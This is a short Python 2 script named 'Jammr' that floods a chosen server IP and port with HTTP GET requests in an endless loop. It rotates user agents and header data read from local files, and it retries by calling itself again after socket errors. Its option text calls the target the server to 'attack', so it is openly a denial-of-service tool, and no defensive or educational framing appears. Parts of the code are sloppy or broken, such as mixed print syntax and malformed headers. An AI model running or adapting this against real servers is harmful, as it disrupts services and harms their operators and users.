#!/usr/bin/pythonw
from optparse import OptionParser
import logging, Queue, random, requests, socket, sys, time

def help():
    print "yada yada"

# Guide - if incorrect optino entered
def guide():
    print "guide"

# Parse arguments
def arguments():
    global host
    global port

    optp = OptionParser(add_help_option=False,epilog="Jammr")
    optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
    optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
    optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')

    if opts.help:
        guide()
    if opts.host is not None:
        host = opts.host
    else:
        guide()
    if opts.port is None:
        port = 80
    else:
        port = opts.port

# Return random user agent
def getUserAgent():
    global data_userAgents
    return(random.choice(data_userAgents))

def jam():
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + getUserAgent() + "\n" + headerData).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,int(port)))
            if s.sendto( packet, (host, int(port)) ):
                s.shutdown(1)
                print ( time.ctime(time.time() ),"*****Packet Sent*****")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
                time.sleep(.1)
    except socket.error as e:
        print(str(e))
        time.sleep(1)
        jam()

# Load userAgents from useragents.txt
data_userAgents = []
with open('useragents.txt') as file:
    data_userAgents = file.readlines()

# Read header data
global headerData
rdr = open("header.txt", "r")
headerData = rdr.read()
rdr.close()

# GLOBAL VARS
host = ''
port = 0
threads = 100

# MAIN
if __name__ == '__main__':
    if len(sys.argv) < 2:
        help()
    arguments()
    print "host: %s port: %s" % (host , port)
    print "%s" % getUserAgent()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        s.settimeout(1)
    except socket.error as e:
        print(e.value)
    jam()
